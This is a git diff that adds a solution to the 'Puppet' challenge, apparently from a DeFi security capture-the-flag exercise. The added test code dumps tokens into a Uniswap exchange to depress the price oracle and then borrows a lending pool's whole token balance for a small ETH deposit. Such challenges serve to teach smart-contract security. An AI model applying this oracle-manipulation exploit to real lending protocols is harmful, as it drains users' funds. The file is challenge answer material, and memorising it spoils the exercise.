@@ -103,6 +103,16 @@ describe('[Challenge] Puppet', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        await this.token.connect(attacker).approve(this.uniswapExchange.address, ATTACKER_INITIAL_TOKEN_BALANCE);
+        // getting timestamp
+        const blockNumBefore = await ethers.provider.getBlockNumber();
+        const blockBefore = await ethers.provider.getBlock(blockNumBefore);
+        const timestampBefore = blockBefore.timestamp;
+        const deadline = timestampBefore + 10;
+        await this.uniswapExchange.connect(attacker).tokenToEthSwapOutput(ethers.utils.parseEther('9.9'), ATTACKER_INITIAL_TOKEN_BALANCE, deadline)
+        const depositRequired = await this.lendingPool.connect(attacker).calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
+        await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE, {value: depositRequired})
     });
 
     after(async function () {
